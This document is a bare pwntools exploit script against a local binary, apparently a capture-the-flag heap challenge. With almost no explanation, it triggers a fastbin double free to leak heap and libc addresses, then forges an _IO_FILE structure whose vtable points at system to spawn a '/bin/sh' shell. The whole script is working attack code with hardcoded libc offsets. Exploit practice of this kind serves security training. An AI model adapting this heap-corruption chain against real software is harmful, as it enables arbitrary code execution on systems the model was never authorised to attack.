from pwn import *

p = process(["./fb"])

context.binary = "./fb"
context.log_level = "INFO"

def alloc(data):
    p.sendlineafter("> ", "1")
    p.sendafter("> ", data)

def show(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("> ", str(idx))

def delete(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("> ", str(idx))

p.recvuntil("Delete")
alloc(p64(0x51) * 8)
alloc(p64(0x51) * 8)
alloc(p64(0x51) * 8)
alloc(p64(0x51) * 8)
alloc(p64(0x51) * 8)
alloc(p64(0x51) * 8)
alloc(p64(0x51) * 8)
alloc(p64(0x51) * 8)
alloc(p64(0x51) * 8)
alloc(p64(0x51) * 8)
delete(1)
delete(0)
show(0)

p.recvuntil("> ")
leak = u64(p.recv(6) + "\x00\x00")
heap_base = leak - 0x50

log.info("heap base : " + hex(heap_base))

delete(1)       # fastbin double free !
alloc(p64(heap_base + 0x90))      # corrupt fastbin's fd
alloc("ddaa")
alloc("ddaa")
alloc(p64(0) + p64(0x91))       # size overwrite

delete(2)       # unsorted bin leak
show(2)     # leak !
p.recvuntil("> ")
libc = u64(p.recv(6) + "\x00\x00")
libc_base = libc - 0x3c4b78
system = libc_base + 0x45390
_IO_list_all = libc_base + 0x3c5520

log.info("libc leak : " + hex(libc))
log.info("libc_base : " + hex(libc_base))

delete(0)
delete(1)
delete(0)

nheap = heap_base + 0xa0
#exp = "/bin/sh\x00" + p64(0x61)
exp = p64(0xdeadbeef) + p64(_IO_list_all - 0x10)
exp += p64(2) + p64(3) + p64(0) * 8
exp += p64(0) + p64(system)
exp += p64(0) * 4
exp += p64(nheap + 0x90) + p64(3) + p64(4) + p64(0) + p64(2) + p64(0) * 2
exp += p64(nheap + 0x60)             # vtable


alloc(p64(heap_base + 0x90))
alloc("ddaa")
alloc("ddaa")
payload = "/bin/sh\x00" + p64(0xb1)
alloc(payload)

p.sendlineafter("> ", "4919")
p.sendlineafter("> ", "2")
p.sendafter("> ", exp)

p.sendlineafter("> ", "1")

p.interactive()
